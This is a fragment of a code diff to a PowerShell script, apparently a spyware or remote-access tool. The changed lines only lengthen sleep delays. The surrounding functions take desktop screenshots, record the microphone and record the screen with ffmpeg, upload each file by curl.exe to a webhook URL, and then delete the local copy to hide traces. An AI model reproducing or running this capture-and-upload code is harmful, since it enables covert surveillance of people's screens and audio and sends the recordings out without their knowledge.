@@ -909,7 +909,7 @@ Function Screenshot {
     .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
     sleep 2
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
-    sleep 3
+    sleep 5
     rm -Path $mkvPath -Force
 
 }
@@ -930,7 +930,7 @@ param ([int[]]$t)
     if ($t.Length -eq 0){$t = 10}
     .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
     curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
-    sleep 3
+    sleep 5
     rm -Path $mp3Path -Force
 }
 
@@ -947,7 +947,7 @@ param ([int[]]$t)
     if ($t.Length -eq 0){$t = 10}
     .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
-    sleep 1
+    sleep 5
     rm -Path $mkvPath -Force
 }
 
